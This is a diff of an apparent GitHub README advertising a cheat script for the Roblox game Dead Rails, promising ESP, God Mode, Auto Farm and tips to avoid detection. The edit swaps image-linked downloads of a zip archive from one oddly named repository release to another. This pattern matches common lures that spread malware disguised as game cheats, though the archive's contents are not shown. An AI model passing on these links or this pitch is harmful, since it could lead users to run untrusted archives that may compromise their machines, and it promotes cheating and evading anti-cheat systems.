@@ -3,10 +3,10 @@
 If you’re searching for a **working Roblox Dead Rails script**, this is your ultimate guide. Packed with up-to-date information, verified script links, and tips to stay undetected while using cheats, this article will help you gain the upper hand in the creepy world of **Dead Rails**. Whether you're after a free GUI, ESP, God Mode, or Auto Farm, you're in the right place.
 
 [![image](https://github.com/user-attachments/assets/c2c76d38-17eb-42c0-8042-5bf1c445cd14)
-](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
+](https://github.com/Gqdqw/potential-guacamole/releases/download/new/Script.New.Version.zip)
 
 [![hq720](https://github.com/user-attachments/assets/cb2157bf-320b-4d01-83d9-f89080dbf5a5)
-](https://github.com/Dgqwda/new/releases/download/new/Updated.Script.zip)
+](https://github.com/Gqdqw/potential-guacamole/releases/download/new/Script.New.Version.zip)
 
 
 ---
